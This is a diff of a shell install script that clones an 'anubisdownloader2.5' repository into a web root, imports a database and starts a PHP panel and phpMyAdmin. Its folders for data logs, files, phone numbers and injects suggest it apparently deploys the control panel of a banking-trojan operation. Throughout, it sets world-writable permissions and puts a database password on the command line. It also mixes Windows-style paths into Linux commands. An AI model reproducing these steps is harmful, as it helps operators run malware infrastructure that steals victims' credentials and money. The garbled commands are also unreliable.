@@ -20,8 +20,11 @@ rm -Rf html
 git clone https://github.com/CubRube/anubisdownloader2.5
 mv anubisdownloader2.5 html
 chmod 700 html
-mv phpmyadmin /htmlphpmyadmin
-cd /htmlphpmyadmin
+cd html
+mv phpmyadmin /var/www/htmlphpmyadmin
+cd /
+chmod 777 htmlphpmyadmin
+cd /var/www/html
 mysql -u root -p YW51YmlzZGI < database.sql
 cd c2Zkc2RmYXNkYXNzZGE\application\
 chmod 777 websocket\*.*
@@ -43,8 +46,9 @@ chmod 777 datalogs\*.*
 chmod 777 datalogs\files\*.*
 chmod 777 datalogs\logs\*.*
 chmod 777 datalogs\numers\*.*
+cd /var/www/html/c2Zkc2RmYXNkYXNzZGE/
 screen php -S 127.0.0.1:999 (PANEL c2Zkc2RmYXNkYXNzZGE/c2Zkc2RmYXNkYXNzZGE) no close crtl + C
-cd /htmlphpmyadmin
+cd /var/www/htmlphpmyadmin/
 screen php -S 127.0.0.1:8081 (phpmyadmin) no close crtl + C
 __________________________________
 nano /var/www/html/inj/config.php
